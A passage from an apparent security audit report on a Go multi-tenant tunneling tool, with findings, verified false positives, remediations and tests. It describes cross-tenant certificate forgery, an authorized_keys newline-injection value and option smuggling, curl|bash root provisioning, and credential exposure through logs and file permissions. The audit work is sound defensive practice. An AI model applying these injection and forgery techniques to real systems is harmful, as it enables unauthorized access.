**What it is.** On a multi-tenant relay the Caddyfile builds a single site-level client_auth trust pool that is the UNION of every tenant's CA cert (`trust_pool file <ca-a> <ca-b> ...`; confirmed by render_test.go TestRenderCaddyfileMultiServerTrustPool, which asserts `trust_pool file /etc/caddy/ca/a.crt /etc/caddy/ca/b.crt`). A presented client certificate is accepted if it chains to ANY CA in that pool. The only per-tenant distinction on each route is a string comparison of the certificate subject against `"CN=<server-id>"` (line 17). Nothing binds a route to the specific CA that is supposed to issue that tenant's certs. Because each tenant/server generates and holds its OWN per-server CA private key (internal/pki GenerateCA, stored client-side, never sent to the relay), a malicious but legitimately-enrolled tenant can use its own CA — which is trusted by the union pool — to issue a client certificate whose subject is exactly `CN=<victim-server-id>`. Server ids are not secret: they are the deterministic `<hostname>-<first8uuid>` value that appears in the URL path (`/tw/<id>`), in client bundles, and in the Caddyfile route paths. verify_if_given does not help here (it verifies presented certs against the pool, which the forged cert passes) and would not help even as require_and_verify, since the defect is the union pool + CN-only match, not the presence check.

**Attack.** Precondition: a multi-tenant, admin-owned relay with at least two enrolled server tenants (not applicable to single-tenant/single-operator relays — one CA, nobody to impersonate). Attacker A is a legitimately admin-enrolled tenant and thus holds its own per-server CA private key, whose public cert is in the relay's union trust pool. A learns victim B's public server-id (the /tw/<id> path segment). A uses CA_A to issue a client cert with Subject CN=<B-id>, then opens a TLS connection to the relay at path /tw/<B-id> presenting that cert. Caddy's client_auth verifies the cert against the union trust_pool (it chains to CA_A, trusted) and the route matcher subject == "CN=<B-id>" passes, so the request is reverse-proxied to B's vless-in inbound. The mTLS/subject isolation gate is bypassed. It stops there: A cannot complete B's VLESS handshake without B's secret per-tenant UUID, and even past VLESS the traffic is SSH gated by B's authorized_keys. Net effect = A reaches B's Xray VLESS inbound as attack surface (defeating a documented isolation property), not unauthorized tunnel use or data access. Real bug, low severity/defense-in-depth.

**Fix.** Bind each route to the issuing CA, not just the CN string. Give each tenant its own TLS handling scoped to only that tenant's CA — e.g. render a per-tenant `trust_pool file <that tenant's CA only>` (Caddy supports per-handle/subroute TLS connection policies keyed on SNI/ALPN is not sufficient here; instead validate the client-cert issuer). Concretely, add an issuer check to the route expression (compare `{http.request.tls.client.issuer}` against the tenant's expected CA subject) in addition to the CN, or terminate each tenant on a distinct hostname/site block with its own single-CA trust_pool. Also enforce CN==id at issuance is already done, but the relay must not trust a foreign CA to assert a given CN.

---

### 11. 🔵 LOW — Proxy credentials logged at INFO to world-readable tw.log and the unauthenticated dashboard log console

**Location:** `internal/xray/xray.go:242` · **Category:** secret-exposure · **Confidence:** high

```go
slog.Info("Xray starting", "relay", fmt.Sprintf("%s:%d", x.cfg.RelayHost, x.cfg.RelayPort), "path", x.cfg.Path, "proxy", proxyURL, "xray_log_level", logging.XrayLevel)
```

**What it is.** When the server or client starts its Xray instance, the full proxy URL is logged verbatim at INFO level: slog.Info("Xray starting", ... "proxy", proxyURL, ...) (also at xray.go:274 for client mode). proxyURL is cfg.Proxy, which SetProxy (internal/ops/ops.go:134) accepts and stores as an arbitrary URL that can embed credentials, e.g. socks5://user:pass@host:port. logging.otelAttrMap does not map or redact the "proxy" key, so the value is emitted in full in both text and JSON formats. INFO is at/above the default level, so the record is always produced. It lands in two places an attacker can reach: (1) tw.log, opened by logging.EnableFileLog with mode 0644 (internal/logging/logging.go:133) — readable by any local user; and (2) the dashboard live-log ring buffer (internal/dashboard/logbuf.go), which tees all slog records including their attrs and is served by the unauthenticated dashboard (no auth, CheckOrigin:true per the WS handler), so anyone who can reach the dashboard — a co-network host if dashboard_listen is 0.0.0.0, or a browser via DNS-rebind/cross-origin GET — can read the buffered proxy credentials.

**Attack.** On a Windows-service install, tw.log in C:\ProgramData\tw\config contains the proxy URL with embedded credentials, readable by local users via default ProgramData ACLs; on any install where the operator sets dashboard_listen: 0.0.0.0 (or via DNS rebinding), the unauthenticated /api/logs buffer includes it. But in both scenarios the attacker can already read the same credentials directly from world-readable config.yaml (0644) or from the unauthenticated GET /api/config, so the log line provides no new attacker capability — it only widens where the secret can incidentally propagate (journald, log shipping, shared debug logs). The Linux "world-readable tw.log" claim is false: file logging is never enabled outside a Windows service.

**Fix.** Never log the raw proxy URL. Parse it and log only scheme + host:port (url.Redacted() strips userinfo), e.g. u.Redacted() or fmt.Sprintf("%s://%s", u.Scheme, u.Host). Apply the same redaction anywhere cfg.Proxy is emitted, and consider adding "proxy" to a redaction list in logging.replaceAttr as defense in depth.

---

### 12. 🔵 LOW — config.yaml written world-readable (0644) exposing proxy credentials and VLESS UUID

**Location:** `internal/config/config.go:331` · **Category:** secret-exposure · **Confidence:** high

```go
if err := os.WriteFile(FilePath(), data, 0644); err != nil {
    return fmt.Errorf("writing config: %w", err)
}
```

**What it is.** config.Save writes the config file with os.WriteFile(FilePath(), data, 0644) into config.Dir() (/etc/tw/config), which is created 0755 (traversable). The serialized config includes the Proxy field (which may contain socks5://user:pass@host credentials) and Xray.UUID (the VLESS client id). Both are secrets and become readable by every local user on the machine. The private keys in the same directory are correctly 0600, so the highest-value material is protected, but the proxy password is fully disclosed by the file mode alone, and the UUID is disclosed as a secondary credential (its abuse is gated by the separately-protected client.key mTLS cert, limiting UUID blast radius).

**Attack.** On a multi-user Linux host where the operator has configured an authenticated upstream proxy (tw proxy set socks5://user:pass@host:port), any unprivileged local user reads /etc/tw/config/config.yaml (0644 in a 0755 directory chain) and recovers the proxy username/password, which is directly reusable against the upstream proxy. The also-disclosed VLESS UUID does not grant tunnel access on its own because the relay's Caddy mTLS gate requires the 0600-protected client cert/key; it only marginally aids an attacker who separately obtains that key material.

**Fix.** Write config.yaml with mode 0600 (it lives beside 0600 key material and contains secrets), matching the private-key files in the same directory. If backward compatibility with existing 0644 files matters, os.Chmod the file to 0600 on save.

---

## Rejected (verified false positives)

These were reported by a hunter but refuted by the verifier — recorded so they aren't re-flagged:

- **isPortAllowed fails open: an authorized_keys entry with no permitopen grants unrestricted port-forwarding to any host:port (SSRF into the private network)** (`internal/ssh/server.go`) — The fail-open code (server.go:404-411: no permitopen extension -> isPortAllowed returns true) exists as described, but neither exploitation vector is reachable by an attacker under the threat model.

Vector 2 (enrolled/updated user with zero mappings) is blocked by validation. Every attacker-reachable path that writes a tenant key to authorized_keys enforces a non-empty mapping set: InviteUser cal
- **Reverse tunnel disables host-key verification, letting a network/relay MITM impersonate the relay SSH endpoint** (`internal/ssh/reverse.go`) — The code fact is correct (InsecureIgnoreHostKey at internal/ssh/reverse.go:157), but the claimed attack ignores the outer authentication layer. The reverse tunnel dials 127.0.0.1:<xrayListenPort> (internal/ops/server.go:135-141), so the SSH handshake exists only inside the Xray VLESS/XHTTP/TLS session, which internal/xray/xray.go:47-86 builds with security:tls, serverName=RelayHost, and no allowIn
- **Server context bundles carry the CA signing key sealed with an empty passphrase (cryptobox provides no confidentiality)** (`internal/ops/addserver.go`) — The technical facts in the report are accurate: internal/ops/addserver.go:180 (and joinflow.go:228, profilebundle.go:119 via ExportCurrentContext) seal bundles with cryptobox.Encrypt(..., ""), the 16-byte salt is stored in-band (cryptobox.go:57-58, read back at 73), so deriveKey("", salt) is reproducible by anyone holding the file and the AES-256-GCM layer provides integrity/format-checking but ze
- **cloud-init YAML injection via unvalidated SSHUser → root code execution on the relay at boot** (`internal/relay/terraform/cloud-init.yaml.tmpl`) — The mechanical facts are correct: cfg.Server.RelaySSHUser is stored with no validation (ops.go:174-186 only checks non-empty) and is substituted raw via text/template (generate.go uses text/template, no escaping) into an unindented mapping position in cloud-init.yaml.tmpl:5 (`- name: {{.SSHUser}}`), which AWS/Hetzner/DO run as root at boot (aws.tf.tmpl user_data). So a newline-bearing value is a r
- **terraform.tfvars built with Go %q from unvalidated Region/Token leaves HCL ${} interpolation active** (`internal/ops/relay.go`) — The mechanical claim is correct: internal/ops/relay.go:339,349 write terraform.tfvars via fmt.Sprintf %q, which escapes quotes/newlines (in a way HCL also accepts) but leaves ${ intact, and req.Region is never checked against the CloudProviders() region list. However, two mitigations kill exploitability. (1) Terraform evaluates .tfvars values as constant expressions only: template sequences refere

---

# Second-pass audit — production sign-off (2026-08-26)

Re-engagement brief: _act as an external security firm and decide whether Tunnel Whisperer can be signed off as production-ready._ Fresh multi-agent pass — 9 finders across distinct subsystems (crypto/PKI, SSH authz, relay/mTLS, provisioning, dashboard, gRPC/IPC, secrets/enrollment, injection, deps/DoS), each finding adversarially verified by an independent skeptic. The finders were told what pass 1 already fixed and left open, so they hunted for **new** issues and regressions. 27 raw → **23 confirmed, 4 rejected**. The pass-1 fixes (#1/#2/#4/#5/#7) were re-reviewed and found **not regressed**.

## Verdict: 🔴 DO NOT SHIP — cannot sign off

A network-security tool whose entire value proposition is tenant isolation on a hostile network has a **new CRITICAL remote authorization bypass** plus several HIGH bypasses of the same class, on top of three still-unfixed HIGHs from pass 1. This does not meet a production bar. Re-audit (not a diff review) required after remediation, because the fixes touch the core admission paths.

**Root cause of the blocking set (one systemic class):** externally-supplied SSH public keys are trusted as well-formed and written into `authorized_keys` with only `strings.TrimSpace`. The single guard that parses (`gossh.ParseAuthorizedKey` at `invite.go:243` and `join.go:73`) checks the error but **discards the `rest` return**, so a two-line payload `validkey\n<injected line>` validates and is written verbatim. `TrimSpace` removes surrounding whitespace, never an embedded newline. The existing test `enroll_test.go:20` ("trailing newline must be trimmed") only covers a *trailing* newline and gives false confidence.

**Highest-leverage fix:** one canonical single-line writer used by every path (`enroll.go`, `invite.go`, `user.go`, `join.go`, `registry.go`) — after `ParseAuthorizedKey`, assert `rest` is empty (or `!strings.ContainsAny(trimmed, "\r\n")`) and write only `gossh.MarshalAuthorizedKey(parsedKey)`, never the raw input. That closes the CRITICAL and all three novel HIGHs at once.

> **✅ Remediated (SP-1 – SP-4), branch `research/security-audit`.** New chokepoint `canonicalAuthorizedKey` (`internal/ops/authkeys.go`): parses the key, rejects any non-empty `rest` (the trailing data the old `ParseAuthorizedKey` guard discarded), and re-marshals to `<type> <base64>` — which also strips comments/options, closing the related `command="…"` option-smuggling variant. Applied at both trust boundaries (`DecodeJoinRequest`, the invite offer handler — reject + normalize) and both sinks (`renderRelayAuthorizedKeys` fail-closed drops a malformed tenant; `appendAuthorizedKey` refuses to write), plus the `AddServer` registry write. Regression tests reproduce SP-1..SP-4 and confirm they're blocked (`authkeys_test.go`, `enroll_test.go`). `go build`/`go vet`/all unit tests green; full `make e2e` 19/19 (ServerJoin, SecondTenant, SelfEnroll, InviteBurn, UserLifecycle, PermitOpen, Revocation all pass). **Verdict remains DO NOT SHIP** — the pass-1 HIGHs (#3/#6/#10) and SP-5…SP-11 are still open.

## Second-pass status table

| # | Severity | Finding | Location |
|---|----------|---------|----------|
| SP-1 | 🔴 CRITICAL | `authorized_keys` newline injection in **relay** enrollment → unrestricted, sudo-capable SSH to the shared relay (full relay root, all tenants' Xray gRPC `:10085`, CA/trust store) | `internal/ops/enroll.go:56` |
| SP-2 | 🟠 HIGH | Same newline-injection on the **server** `authorized_keys` (invite path) → escapes `permitopen`, port-forward to any host (SSRF/lateral, cloud metadata) | `internal/ops/invite.go:349` |
| SP-3 | 🟠 HIGH | Same on the relay via a **joining server's** pubkey → `-L` to `127.0.0.1:10085`, cross-tenant UUID add/remove, control-plane DoS | `internal/ops/enroll.go:56` |
| SP-4 | 🟠 HIGH | Same in **`appendAuthorizedKey`** (invited client) → bypass `permitopen` port pins | `internal/ops/user.go:622` |
| SP-5 | 🟡 MEDIUM ✅ | Relay `freedom` outbound is default-allow → authenticated tenant is an open proxy to arbitrary public hosts on :22 and RemotePort (scan/laundering from relay IP) | `internal/relay/xray/relayconfig.json.tmpl:41` |
| SP-6 | 🟡 MEDIUM ✅ | Cloud-init provisions relay via unpinned `curl \| bash` as root (no `-f`, tracks `main`) → provisioning-time root RCE | `internal/relay/terraform/cloud-init.yaml.tmpl:69` |
| SP-7 | 🟡 MEDIUM ✅ | Relay management/terminal/reverse SSH uses `InsecureIgnoreHostKey` → on-path MITM of relay-hardening ops | `internal/ops/relay.go:801` |
| SP-8 | 🟡 MEDIUM ✅ | Dashboard management plane is cleartext HTTP, bindable to all interfaces, no TLS → Bearer token / session cookie sniffable | `internal/cli/dashboard.go:194` |
| SP-9 | 🟡 MEDIUM ✅ | Local gRPC control plane loopback-bound but **unauthenticated** → any local process overwrites keys/config, flips mode, deletes users, reads secrets | `internal/api/server.go:19` |
| SP-10 | 🟡 MEDIUM ✅ | Embedded SSH server handshake has **no deadline** → pre-auth Slowloris / goroutine-exhaustion DoS | `internal/ssh/server.go:246` |
| SP-11 | 🟡 MEDIUM ✅ | Embedded SSH server binds **all interfaces** instead of loopback → widens auth/DoS surface to the LAN | `internal/ssh/server.go:205` |
| SP-12 | 🔵 LOW ✅ | Portable `.twctx` identity bundles "sealed" with a **hardcoded empty passphrase** — CA signing key/host key/client keys have zero real confidentiality despite AES-GCM/argon2id framing | `internal/ops/profilebundle.go:119` |
| SP-13 | 🔵 LOW ✅ | Integer-overflow in `direct-tcpip` length parse → OOB-slice panic (contained only by deferred `recover()`) | `internal/ssh/server.go:323` |
| SP-14 | 🔵 LOW ✅ | Relay provisioning artifacts written world-readable → VLESS UUID + terraform state exposed | `internal/relay/terraform/generate.go:71` |
| SP-15 | 🔵 LOW ✅ | No security response headers (CSP / X-Frame-Options / X-Content-Type-Options) on any dashboard response | `internal/dashboard/server.go:167` |
| SP-16 | 🔵 LOW ✅ | Username rendered into `innerHTML` without escaping (latent stored XSS) | `internal/dashboard/static/js/bandwidth.js:90` |
| SP-17 | 🔵 LOW ✅ | `GetConfig` returns tunnel secrets (VLESS UUID, proxy `user:pass`) over the unauthenticated control plane | `internal/api/handlers.go:55` |
| SP-18 | 🔵 LOW ✅ | `UploadClientConfig` unzips with no size cap → decompression-bomb memory DoS | `internal/ops/setup.go:51` |
| SP-19 | 🔵 LOW ✅ | Dashboard/invite HTTP servers set no request timeouts (Slowloris) | `internal/dashboard/server.go:167` |
| SP-20 | 🔵 LOW ✅ | `permitopen` port-forward gate defaults to **allow-all** when unset (fail-open) | `internal/ssh/server.go:445` |
| SP-21 | ℹ️ INFO ⚠️ | Client context bundle (SSH + cert private keys) left in a shared temp dir, empty-passphrase sealed, not cleaned up | `internal/ops/joinflow.go:269` |

_Note: SP-20 (fail-open `permitopen` default) is the same code pass 1 rejected as "not attacker-reachable" — but SP-1/SP-4 make it reachable, since a key can now be injected with **no** `permitopen` line. The two findings compound._

> **✅ Remediated (SP-6, SP-7), branch `research/security-audit`.**
> - **SP-6** — the cloud-init Xray install no longer pipes `curl` into a root shell: it downloads the installer to a file with `curl -fsSL --retry` and runs `bash <file>` (matching the manual `install-script.sh.tmpl`, which was already hardened), so a served error page can't be executed. Regression test `TestXrayInstallNotPipedToShell`.
> - **SP-7** — the relay is now provisioned with a **tw-generated SSH host key** injected via both paths (cloud-init `write_files` + the manual script, guarded so an empty key is a no-op), and `DirectRelaySSH` (the plain port-22 channel) **pins it fail-closed** with `gossh.FixedHostKey` + `HostKeyAlgorithms: [ed25519]`. A relay provisioned before this change (no pinned key) falls back to trust-on-connect with a loud warning, and `CloseRelaySSH` already degrades from the direct path to the mTLS-authenticated Xray tunnel on error. The `withRelaySSH`/reverse-tunnel paths keep `InsecureIgnoreHostKey` deliberately — they run *inside* the relay's authenticated VLESS/mTLS TLS session to loopback (the pass-1 "reverse tunnel MITM" finding was rejected for the same reason). New: `internal/ops/relayhostkey.go`; tests `relayhostkey_test.go`, `TestRelayHostKeyInjected`. `make e2e` 19/19 (RelayInstall exercises the pinned direct channel; no host-key mismatch/fallback warnings in the run).

> **✅ Remediated (SP-9, SP-17), branch `research/security-audit`.** Loopback is no longer treated as an auth boundary: the gRPC control plane now requires a **per-daemon bearer token** on **every** RPC (`internal/api/auth.go`). The daemon generates a 32-byte token into a 0600 file (`config.APITokenPath()` → `<config-dir>/api.token`, mirroring the dashboard token) on startup; a `grpc.UnaryServerInterceptor` constant-time-compares the `authorization: Bearer <token>` metadata and returns `Unauthenticated` otherwise; the CLI attaches it via per-RPC credentials that permit the insecure loopback transport. Because the gate is uniform it also closes **SP-17** — `GetConfig`'s secret fields (VLESS UUID, proxy `user:pass`) are no longer readable without the token. A local process that cannot read the operator's 0600 file can no longer overwrite keys/config, flip mode, delete users, or read secrets. Tests: `internal/api/auth_test.go` (interceptor allow/deny matrix, per-RPC creds, token stability + 0600). `make e2e` 19/19 (UserLifecycle/Revocation drive list/delete users over the authenticated API; no `Unauthenticated` errors in the run).

> **✅ Remediated (SP-10, SP-11), branch `research/security-audit`.** The embedded SSH server (`internal/ssh/server.go`) is hardened against the pre-auth DoS surface:
> - **SP-11** — it now binds `127.0.0.1:<port>` instead of `:<port>`. The only legitimate consumer is the reverse tunnel, which already dials `127.0.0.1:<sshPort>` from the same host (`internal/ops/server.go:140`) and republishes the port on the relay, so no functionality is lost and the pre-auth surface is no longer exposed to the LAN.
> - **SP-10** — each connection's handshake now runs under a 30s deadline (`conn.SetDeadline`, cleared once the handshake settles so the authenticated tunnel stays long-lived), and in-flight pre-auth handshakes are bounded by a semaphore (`maxConcurrentHandshakes = 64`): beyond the cap a new connection is dropped immediately rather than spawning an unbounded goroutine. A stalled/slowloris client can no longer pin a goroutine/fd. Authenticated abuse is separately gated by per-key `permitopen`/`single-session`, so no global session cap is needed.
> Tests: `internal/ssh/server_dos_test.go` (`TestServerBindsLoopback`, `TestHandleConnectionDropsWhenSaturated`). `make e2e` 19/19 (PermitOpen/PortOverride/ProxyRoute exercise the SSH data path; the reverse tunnel reaches the loopback-bound server unchanged).

> **✅ Remediated (SP-8), branch `research/security-audit`.** The dashboard now refuses to bind a non-loopback address over cleartext HTTP unless the operator explicitly opts in (`server.dashboard_allow_lan: true`), and warns loudly even then that the bearer token/session cookie travel in cleartext and must be fronted by a TLS terminator (`internal/dashboard/server.go` `Run` + `isLoopbackHost`). The session cookie also now carries `Secure` whenever the request arrived over TLS (`r.TLS` or `X-Forwarded-Proto: https`), so behind a terminator it is never sent back over cleartext. Default (loopback) binding is unchanged. Tests: `internal/dashboard/bind_test.go` (`TestIsLoopbackHost`, `TestIsRequestTLS`, `TestRunRefusesOffLoopbackWithoutOptIn`). `make e2e` 19/19.

> **✅ Remediated (SP-5), branch `research/security-audit`.** The relay's `freedom` outbound is now loopback-only: its `finalRules` allow `127.0.0.1/32` and then **block `0.0.0.0/0` + `::/0`** (evaluated in order), so a tenant's VLESS traffic can reach only the relay's own loopback rendezvous port — never an arbitrary public host on :22 or the RemotePort. The relay's whole job is `vless → freedom → 127.0.0.1:<port>`, so no legitimate traffic is affected. `internal/relay/xray/relayconfig.json.tmpl`; test `TestRenderConfigFreedomLoopbackOnly` asserts allow-before-block. `make e2e` 19/19 (the real relay xray accepts the config and the tunnel still carries bytes). Residual: no adversarial e2e yet crafts a non-loopback VLESS target to prove the blackhole end-to-end (harness lacks a raw VLESS client) — tracked as a follow-up.

## What must be true before this firm can sign off

1. **Close the injection class centrally** — one validated single-line `authorized_keys` writer (SP-1..SP-4), with a regression test for embedded `\r`/`\n` on every enroll/invite/join/user-add path and an e2e scenario asserting an injected line never appears in the rendered file.
2. **Remediate the three still-open pass-1 HIGHs** — #3 (Terraform/HCL injection via relay Name), #6 (install-script shell injection), #10 (shared `trust_pool` cross-tenant impersonation).
3. **Secure-by-default provisioning** — pin the relay SSH host key fail-closed (SP-7), and stop `curl|bash`-as-root provisioning: pin a commit + verify a checksum (SP-6).
4. **Harden the two control planes** — local peer-cred/token auth on the gRPC API (SP-9); refuse off-loopback dashboard binds without TLS + `Secure` cookie (SP-8).
5. **DoS hardening on the SSH data path** — handshake deadline + loopback bind + connection cap (SP-10, SP-11), and fix the length-parse overflow rather than rely on `recover()` (SP-13).
6. **Then re-audit** — a fresh pass over the changed admission paths, not a diff review.

## Rejected in second pass (verified false positives)

- **cryptobox argon2id time-cost = 1 is below guidance** (`cryptobox.go:24`) — real config value, but immaterial: the passphrase is the empty string everywhere, so KDF hardness is moot (captured instead by SP-12).
- **Reverse tunnel `InsecureIgnoreHostKey`** (`reverse.go:157`) — same refutation as pass 1: the SSH handshake runs *inside* the Xray VLESS/TLS session dialed to relay loopback, so there is no MITM position.
- **No CSRF token on state-changing endpoints** (`handlers_api.go:133`) — the pass-1 #4 fix (token auth + `SameSite=Strict` cookie, no ambient-credential GET-to-POST) already closes the CSRF vector.
- **Unescaped `err.Error()` concatenated into a WS JSON frame** (`handlers_ws.go:164`) — malformed JSON at worst; the error string is server-controlled and not attacker-reflected into a trust boundary.

---

## Adversarial e2e coverage (2026-08-27)

Beyond the unit tests that accompany each fix, the `make e2e` suite now proves two of the highest-value security properties over the **real relay + tunnel**, not just in isolation:

- **`TestE2E/APIAuth` (SP-9)** — with the daemon running, `tw server user list` works with the real token; swapping `api.token` for a bogus value makes the same RPC fail with an auth error; restoring it restores access. Proves the gRPC control plane rejects a caller without the token.
- **`TestE2E/CrossTenantCert` (#10)** — asserts the **live** relay Caddyfile pins the client-cert issuer on every tenant route, then forges a cert carrying the victim tenant's CN signed by the **attacker's own pool-trusted CA** and presents it to the victim's `/tw/<id>` route: the relay refuses it (HTTP 404, not proxied to the victim's upstream).

The existing suite already covers the mTLS gate adversarially (`CertlessProbe`, `MTLSGate`: no-cert and non-pool foreign cert), the dashboard token gate (`Dashboard`: unauthenticated → 401), and invite abuse (`InviteBurn`).

**Deferred adversarial scenarios** (logic covered by unit tests; a real-tunnel scenario needs test-only tooling the harness does not yet have):

- **SP-1…SP-4** (`authorized_keys` newline injection) — needs a crafted enrollment offer / join request carrying an embedded newline; the tw CLI only ever produces well-formed offers. Covered by `internal/ops/authkeys_test.go`, `join_test.go`, `enroll_test.go`.
- **SP-5** (relay open-proxy blackhole) — needs a raw VLESS client that sets an arbitrary (non-loopback) target address; the tw client always targets the loopback rendezvous port. Covered by `TestRenderConfigFreedomLoopbackOnly` (allow-before-block) plus the live tunnel proving loopback traffic still flows.
- **SP-7** (relay/server host-key mismatch) — needs a cross-container host-key swap that does not corrupt state for later shared-topology scenarios. Covered by `internal/ssh/forward_test.go` (fail-closed pinning) and `relayhostkey_test.go`.

---

## Post-remediation re-audit + dependency scan (2026-08-27)

A fresh adversarial re-audit (9 lanes, each trying to BREAK a specific fix, adversarially verified) was run against the CHANGED code — the "re-audit, not diff-review" condition. **The core controls all held**: authorized_keys canonicalization, mTLS subject+issuer binding, the gRPC bearer-token interceptor, dashboard auth + off-loopback guard, forward-path host-key pinning, the pre-auth DoS caps, provisioning allowlists, and relay loopback-only egress all withstood the break attempts (8 raw findings → 6 confirmed, none re-opening a CRITICAL/HIGH). Two MEDIUM items were found and **fixed**:

- **Regression (fixed)** — `UploadClientConfig` (`internal/ops/setup.go`) unpacked `config.yaml` at `0644`, re-introducing #12 on the dashboard/import sibling path. Now `0600` for `config.yaml`/keys/`*.token`; `config.Save` also `os.Chmod`s to tighten an existing file on upgrade. Test `TestUploadClientConfigWritesSecrets0600`.
- **Fail-open (fixed)** — `DirectRelaySSH` fell back to `InsecureIgnoreHostKey` when no host key was pinned, and the pin was not carried in the profile bundle. Now it **fails closed** (callers fall back to the mTLS tunnel), and `relay_host_ed25519(.pub)` travels in the bundle so a second-machine admin can verify.

**Accepted / documented residuals** (not ship-blocking; flagged for the human review):

- **Windows config-dir ACLs (MEDIUM, platform, needs Windows testing).** On Windows, Go's `0600` mode bit does not create a restrictive ACL, so `api.token`/`dashboard.token`/`config.yaml`/`ca.key` under `C:\ProgramData\tw\config` inherit `BUILTIN\Users:Read`. This is a **systemic** Windows gap (not unique to any one fix) and does not affect the single-interactive-user desktop model or Linux. Proper fix: set an owner-only DACL on the config dir at install time (`golang.org/x/sys/windows`). Deliberately not shipped here because it is untestable from this Linux/WSL checkout — writing unverified Windows ACL code would be its own risk.
- **Relay host private key in cloud-init user-data (INFO, accepted).** The pinning fix injects the tw-generated relay host key via provisioning payload, which is metadata-readable — an accepted tradeoff, the same trust class as the VLESS UUID already carried there. Mitigate with IMDSv2/hop-limit=1 at the cloud layer.
- **Single relay host key reused across relays from one machine (LOW).** Blast-radius limiter, not a disclosure; per-relay keying is a future improvement.

Two findings were rejected on verification (a stale doc comment — since corrected — and a claimed semaphore-leak that does not occur).

### Dependency / SCA scan (`govulncheck`)

The pinned toolchain had drifted behind published security patches: **8 reachable vulnerabilities** (7 Go standard library — `net/url`, `html/template`, `crypto/tls` ×2, `net/http` ×2, `encoding/asn1`; 1 in `google.golang.org/grpc` v1.81.1). Remediated by bumping the toolchain to **`go1.26.6`** and **gRPC to `v1.82.1`**; a re-scan reports **0 reachable vulnerabilities** (the remaining transitive advisories are in code paths tw does not call). `make e2e` 21/21 on the bumped toolchain.
